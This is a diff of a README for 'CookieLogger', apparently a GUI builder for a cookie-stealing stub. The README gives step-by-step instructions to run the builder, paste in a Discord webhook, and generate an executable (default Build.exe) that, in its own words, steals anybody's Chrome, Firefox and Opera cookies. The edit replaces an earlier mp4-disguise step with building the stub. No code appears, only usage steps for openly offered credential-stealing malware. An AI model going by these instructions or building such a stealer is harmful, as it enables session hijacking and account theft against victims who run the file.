@@ -13,12 +13,12 @@ Step 3; run the CookieLogger.exe file and wait until the gui opens
 
 Step 4; get your discord webhook and put it in the box that says WEBHOOK_HERE
 
-Step 5; Where it says mp4 file here, click the small up arrow and go to the file where the mp4 is saved 
+Step 5;  enter name OPTINAL Deafault= Build.exe
 
-Step 7; Click Create mp4
+Step 7; Click Create Stub and wait until it finishes and then go to the folder where the cookielogger.exe is saved the stub should be ther eunder the name you chose or the deaufalt name build.exe
 
 # What It Does
-Its a simple gui i made that creates a mp4 logger and it steals anybodys chrome, firefox, opera cookies
+Its a simple gui i made that creates a stub and it steals anybodys chrome, firefox, opera cookies
 
 # credits
 
